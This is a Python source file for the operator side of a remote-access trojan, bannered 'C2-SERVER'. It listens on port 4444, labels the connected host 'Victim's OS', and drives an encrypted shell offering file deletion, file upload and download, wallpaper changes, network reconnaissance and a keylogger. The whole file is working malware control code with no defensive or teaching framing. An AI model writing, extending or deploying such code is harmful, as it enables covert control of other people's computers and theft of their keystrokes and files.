import socket
import os
import time
from cryptography.fernet import Fernet

class EncryptedServer:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.cipher = None
        self.operating_system = None
        self.conn = None

    def Start_server(self):
        self.sock.bind(("0.0.0.0", 4444))
        self.sock.listen(1)
        print("[*] Listening for Connections ...")
        self.conn, addr = self.sock.accept()
        print(f"[*] Connection from {addr}")
        key = self.conn.recv(1024)
        self.cipher = Fernet(key)
        self.operating_system = self.conn.recv(1024).decode()
        print(f"Victim's OS => {self.operating_system}")

    def encrypt(self, data: bytes) -> bytes:
        return self.cipher.encrypt(data)

    def decrypt(self, data: bytes) -> bytes:
        return self.cipher.decrypt(data)

    def download(self,filename):
        with open(f'{filename}','wb') as file:
            chunk_number = 1
            while True:    
                data = self.conn.recv(1024)
                if (data==b"Done"):
                    break
                file.write(data)
                print(f"chunk {chunk_number} received.", end='\r',flush=True)
                chunk_number += 1
            file.close()
            print("\nFile received successfully.")

    def upload(self,filename):
        with open(filename, 'rb') as file:
            chunk_number = 1
            while True:
                data_chunk = file.read(1024)
                self.conn.sendall(data_chunk)
                if  data_chunk == b'':
                    self.conn.sendall(b'Done')
                    break               
                print(f"Chunk {chunk_number} sent.", end='\r',flush=True)
                chunk_number += 1
                time.sleep(0.2)
            file.close()
            print("\nFile sent successfully.")

    def to_chunks(self, data: bytes, chunk_size: int = 1024):
        return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

    def authenticate(self):
        for times in range(3):
            print(self.decrypt(self.conn.recv(1024)).decode(), end="")
            self.conn.send(self.encrypt(input().encode()))
            print(self.decrypt(self.conn.recv(1024)).decode(), end="")
            self.conn.send(self.encrypt(input().encode()))

            result = self.decrypt(self.conn.recv(1024)).decode()
            print(result)
            if "successful" in result:
                return True
        self.conn.close()
        return False

    def send_command(self, command: str):
        self.conn.sendall(self.encrypt(command.encode()))

    def handle_response(self, command: str):
        if "del" in command:
            print(self.decrypt(self.conn.recv(1024)).decode())

        elif "keylogger" in command:
            while True:
                data = self.decrypt(self.conn.recv(1024)).decode()
                if data != "Done":
                    print(data.strip())
                else:
                    break

        elif "upload" in command:
            file_name = command.split(" ")[1]
            self.send_command(file_name)
            self.upload(file_name)

        elif "download" in command:
            file_name = command.split(" ")[1]
            self.send_command(file_name)
            self.download(file_name)

        else:
            num_chunks = int(self.decrypt(self.conn.recv(1024)).decode())
            print(f"Chunks coming: {num_chunks}")
            encrypted_data = b''
            for _ in range(num_chunks):
                encrypted_data += self.conn.recv(1024)
                print(f"Chunk number {_} received. ", end="\r",flush=True)
            try:
                print(self.decrypt(encrypted_data).decode())
            except Exception as e:
                print(f"Error decrypting data: {e}")

    def run(self):
        try:
            if not self.authenticate():
                return

            print("""\nAvailable commands:
dir, path, ipconfig, arp -a
del [file], cd [path], download [file], upload [file], wall [img], keylogger [count] [buf]
                    """)

            while True:
                command = input("shell> ").strip()
                if command == "help":
                    print("""Available commands:
dir, path, ipconfig, arp -a
del [file], cd [path], download [file], upload [file], wall [img], keylogger [count] [buf]
                    """)
                    continue

                elif (command.lower() == "exit") or (command.lower() == "close"):
                    print("\n[!] Interrupted by user. Closing connection.")
                    self.send_command("close")
                    self.conn.close()
                    break

                self.send_command(command)
                self.handle_response(command)

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user. Closing connection.")
            self.send_command("close")
        finally:
            self.conn.close()


if __name__ == "__main__":
    print("""
 ██████╗██████╗       ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
██╔════╝╚════██╗      ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
██║      █████╔╝█████╗███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
██║     ██╔═══╝ ╚════╝╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
╚██████╗███████╗      ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
 ╚═════╝╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
""")
    server = EncryptedServer()
    server.Start_server()
    server.run()
